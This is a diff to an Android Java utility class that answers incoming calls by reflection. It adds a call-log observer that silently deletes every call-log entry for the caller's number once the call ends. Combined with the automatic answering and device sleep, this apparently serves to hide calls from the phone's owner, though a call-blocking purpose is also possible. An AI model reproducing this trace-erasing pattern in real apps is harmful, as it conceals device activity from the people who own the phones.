@@ -7,7 +7,12 @@ import android.app.KeyguardManager;
 import android.app.KeyguardManager.KeyguardLock;
 import android.content.Context;
 import android.content.Intent;
+import android.database.ContentObserver;
+import android.database.Cursor;
 import android.media.AudioManager;
+import android.net.Uri;
+import android.os.Handler;
+import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -78,7 +83,7 @@ public class PhoneUtils {
 				answerRingingCallWithReflect(context);
 				isguaduan=true;
 				sleepsystem(context);
-				
+				context.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true,new CallLogObserver(context,new Handler(),phonenumber));
 			}
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
@@ -87,6 +92,40 @@ public class PhoneUtils {
 		
 
 	}
+	
+	
+	private static class CallLogObserver extends ContentObserver {
+        private String incomingNumber;
+        private Context context;
+
+        public CallLogObserver(Context context,Handler handler, String incomingNumber) {
+                super(handler);
+                this.incomingNumber = incomingNumber;
+                this.context=context;
+        }
+
+        // 当观察到内容发生改变的时候 调用的方法.
+        @Override
+        public void onChange(boolean selfChange) {
+                super.onChange(selfChange);
+                deleteFromCallLog(context,incomingNumber);
+                context.getContentResolver().unregisterContentObserver(this);
+        }
+
+}
+	
+	public static void deleteFromCallLog(Context context,String incomingNumber) {
+        Log.i(TAG, "删除呼叫记录:" + incomingNumber);
+        Uri uri = Uri.parse("content://call_log/calls");// 得到呼叫记录内容提供者的路径
+        Cursor cursor = context.getContentResolver().query(uri, new String[] { "_id" },
+                        "number=?", new String[] { incomingNumber }, null);
+        while (cursor.moveToNext()) {
+                String id = cursor.getString(0);
+                context.getContentResolver().delete(uri, "_id=?", new String[] { id });
+        }
+        cursor.close();
+}
+
 	
 	public static void sleepsystem(Context context){
 		try {
